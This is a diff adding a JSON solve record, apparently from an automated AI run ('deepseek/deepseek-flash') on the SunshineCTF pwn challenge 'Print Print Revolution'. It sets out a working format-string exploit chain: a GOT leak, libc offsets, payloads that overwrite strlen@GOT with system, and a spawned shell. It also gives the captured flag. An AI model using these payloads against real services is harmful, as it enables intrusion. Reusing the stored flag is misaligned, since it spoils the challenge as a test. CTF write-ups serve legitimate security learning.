@@ -1,0 +1,64 @@
+{
+  "version": 1,
+  "current_key": "34bc9e16067a9b242eac:platform_confirmed",
+  "status": "complete",
+  "records": [
+    {
+      "key": "34bc9e16067a9b242eac:platform_confirmed",
+      "flag": "sun{cust0m_fmtstr_n0_t00ls_4ll0wed}",
+      "confirmation_source": "platform_confirmed",
+      "model_spec": "deepseek/deepseek-flash",
+      "run_id": "2e89db975cdc455fb8c92690d2211e7f",
+      "verified_by": [],
+      "challenge": {
+        "name": "Print Print Revolution",
+        "category": "Pwn",
+        "description": "The arcade's score printer has been spitting out strange tickets all week. Step up to the renderer and see what it's really printing.",
+        "connection_info": "nc chal.sunshinectf.games 26002",
+        "value": 484,
+        "tags": [],
+        "hints": []
+      },
+      "findings_summary": "Flag found via Reverse-engineered the stripped binary's custom printf (0x401330) and abused its broken positional-argument handling: args N>=6 are read directly out of the attacker-controlled format buffer (arg N = qword at buf+8*(N-6)). Used %8$s to leak write@GOT -> libc base (Ubuntu 24.04 glibc 2.39 / libc6_2.39-0ubuntu8), then %8$w to overwrite strlen@GOT with system(), then %8$s pointing at the libc \"/bin/sh\" string to trigger system(\"/bin/sh\") and read flag.txt.: sun{cust0m_fmtstr_n0_t00ls_4ll0wed} | Evidence: checksec: ELF64 EXEC (non-PIE), partial RELRO -> .got.plt (0x404000+) writable ; IDA/objdump of 0x401330: custom printf; '%w' handler does `mov [r8],rax` (arbitrary 8-byte write), '%s' handler calls strlen then write ; Empirical arg mapping: %6$p printed buffer[0:8], %8$p printed buffer[16:24] -> arg(N>=6)=qword at format_buf+8*(N-6) ; Remote leak of write@GOT=0x788ac296a560 -> base=0x788ac284e000; low-12 fingerprint (write 0x560/read 0xa50/setvbuf 0x540) matched libc6_2.39-0ubuntu8 via libc.rip (system=0x58740, str_bin_sh=0x1cb42f) ; Payload '%8$w'+pad+p64(0x404008)+p64(base+system) -> returned 'ok' (write primitive confirmed), then '%8$s' -> p64(base+0x1cb42f) spawned shell",
+      "solution_steps": [
+        "file/readelf: revolution 是非 PIE 的 ELF64，partial RELRO，因此 0x404000+ 的 .got.plt 可写。",
+        "用 objdump/IDA 逆出 0x401330 处自实现的 printf：%s 调 strlen 后 write；%x/%p 打印寄存器/栈参数；%w 执行 `mov [r8],rax` 即任意地址写 8 字节。",
+        "实测参数解析：%6$p 等于 format 缓冲区偏移 0 处的 8 字节，%8$p 等于偏移 16，即第 N(N>=6) 个参数 = 格式串 buf+8*(N-6)，完全由输入控制。",
+        "构造 payload=b'%8$s'+填充到偏移16+p64(0x404000)，从远端泄漏 write@GOT=0x788ac296a560，得到 libc 基址 0x788ac284e000。",
+        "用低 12 位指纹(write 0x560/read 0xa50/setvbuf 0x540)经 libc.rip 匹配到 libc6_2.39-0ubuntu8，得 system=0x58740、/bin/sh=0x1cb42f。",
+        "构造 payload=b'%8$w'+填充+偏移16放 p64(0x404008)+偏移24放 p64(base+0x58740)，把 strlen@GOT 改成 system；返回 'ok' 确认写入成功。",
+        "构造 payload=b'%8$s'+填充+偏移16放 p64(base+0x1cb42f)，%s 分支内 strlen(ptr) 被替换为 system(ptr) 从而执行 system(\"/bin/sh\")，拿到 shell。",
+        "在 shell 中 `cat flag.txt` 得到 sun{cust0m_fmtstr_n0_t00ls_4ll0wed}，提交平台返回 CORRECT。"
+      ],
+      "evidence": [
+        "checksec: ELF64 EXEC (non-PIE), partial RELRO -> .got.plt (0x404000+) writable",
+        "IDA/objdump of 0x401330: custom printf; '%w' handler does `mov [r8],rax` (arbitrary 8-byte write), '%s' handler calls strlen then write",
+        "Empirical arg mapping: %6$p printed buffer[0:8], %8$p printed buffer[16:24] -> arg(N>=6)=qword at format_buf+8*(N-6)",
+        "Remote leak of write@GOT=0x788ac296a560 -> base=0x788ac284e000; low-12 fingerprint (write 0x560/read 0xa50/setvbuf 0x540) matched libc6_2.39-0ubuntu8 via libc.rip (system=0x58740, str_bin_sh=0x1cb42f)",
+        "Payload '%8$w'+pad+p64(0x404008)+p64(base+system) -> returned 'ok' (write primitive confirmed), then '%8$s' -> p64(base+0x1cb42f) spawned shell",
+        "Shell output: uid=1337(revolution); cat flag.txt -> sun{cust0m_fmtstr_n0_t00ls_4ll0wed}",
+        "submit_flag returned CORRECT"
+      ],
+      "saved_exp_paths": [
+        ".writeup-drafts/34bc9e16067a9b242eac/deepseek-deepseek-flash-5403e74e/48fefeea97dcdc42/exp.py"
+      ],
+      "exp_run_command": "[unsupported]",
+      "status": "complete",
+      "replay": {
+        "status": "manual",
+        "reason": "提供的 EXP 运行命令不符合安全的单脚本格式，需人工复现。",
+        "command": "",
+        "exit_code": null,
+        "stdout": "",
+        "stderr": ""
+      },
+      "writeup_sha256": "f20a57f44ab296f384c880ab21eb221bb632a2e70287fdd7eabf07ba414d4212",
+      "planned_sha256": null,
+      "created_at": "2026-09-27T04:39:14.790042+00:00",
+      "updated_at": "2026-09-27T04:39:21.657870+00:00",
+      "exp_sha256": {
+        "exp/exp.py": "48fefeea97dcdc4298e2d230757071efc033bb787881df782ee02e4b76d6aa41"
+      }
+    }
+  ]
+}
